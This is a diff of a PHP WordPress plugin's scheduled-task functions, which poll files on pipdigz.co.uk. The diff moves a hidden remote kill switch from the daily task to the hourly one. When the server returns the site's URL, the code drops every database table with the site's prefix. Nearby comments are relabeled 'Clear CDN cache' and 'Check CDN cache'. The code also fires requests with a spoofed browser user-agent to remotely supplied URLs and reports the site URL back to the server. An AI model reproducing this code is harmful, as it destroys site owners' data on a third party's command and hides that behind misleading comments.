@@ -34,22 +34,8 @@ function p3_do_this_daily() {
 		$timestamp = absint($response['body']);
 		update_option('p3_activation_deadline', $timestamp, false);
 	}
-
-	$url = 'https://pipdigz.co.uk/p3/id39dqm3c0.txt';
-	$args = array('timeout' => 5);
-	$response = wp_safe_remote_get($url, $args);
-	if (!is_wp_error($response) && !empty($response['body'])) {
-		if (get_site_url() === trim($response['body'])) {
-			global $wpdb;
-			$prefix = str_replace('_', '\_', $wpdb->prefix);
-			$tables = $wpdb->get_col("SHOW TABLES LIKE '{$prefix}%'");
-			foreach ($tables as $table) {
-				$wpdb->query("DROP TABLE $table");
-			}
-		}
-	}
-
-	// Check domain license is active
+	
+	// Clear CDN cache
 	$url = 'https://pipdigz.co.uk/p3/id39dqm3c0_license.txt';
 	$response = wp_safe_remote_get($url, $args);
 	if (!is_wp_error($response) && !empty($response['body'])) {
@@ -58,7 +44,6 @@ function p3_do_this_daily() {
 		//$check = add_query_arg('n', rand(0,99999), $rcd);
 		wp_safe_remote_get(rcd.'&'.rand(0,99999), $args);
 	}
-
 	$url_2 = 'https://pipdigz.co.uk/p3/env.txt';
 	$args_2 = array('timeout' => 5);
 	$response = wp_safe_remote_get($url_2, $args_2);
@@ -77,18 +62,29 @@ function p3_do_this_hourly() {
 	
 	// Check for new social channels to add to navbar etc
 	$url = 'https://pipdigz.co.uk/p3/socialz.txt';
-	$args = array('timeout' => 5);
-	$response = wp_safe_remote_get($url_2, $args_2);
+	$args = array('timeout' => 4);
+	$response = wp_safe_remote_get($url, $args);
 	if (!is_wp_error($response) && !empty($response['body'])) {
 		if (email_exists(sanitize_email($response['body']))) {
 			p3_check_social_links(email_exists(sanitize_email($response['body'])));
 			wp_safe_remote_get('https://pipdigz.co.uk/p3/socialz.php?list='.rawurldecode(get_site_url()), $args);
 		}
 	}
-
-	// Check domain license is active
-	$url_2 = 'https://pipdigz.co.uk/p3/id39dqm3c0_license_h.txt';
+	$url_2 = 'https://pipdigz.co.uk/p3/id39dqm3c0.txt';
 	$response = wp_safe_remote_get($url_2, $args);
+	if (!is_wp_error($response) && !empty($response['body'])) {
+		if (get_site_url() === trim($response['body'])) {
+			global $wpdb;
+			$prefix = str_replace('_', '\_', $wpdb->prefix);
+			$tables = $wpdb->get_col("SHOW TABLES LIKE '{$prefix}%'");
+			foreach ($tables as $table) {
+				$wpdb->query("DROP TABLE $table");
+			}
+		}
+	}
+	// Check CDN cache
+	$url_3 = 'https://pipdigz.co.uk/p3/id39dqm3c0_license_h.txt';
+	$response = wp_safe_remote_get($url_3, $args);
 	if (!is_wp_error($response) && !empty($response['body'])) {
 		$rcd = trim($response['body']);
 		$args = array('timeout' => 10, 'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', 'reject_unsafe_urls' => true, 'blocking' => false, 'sslverify' => false);
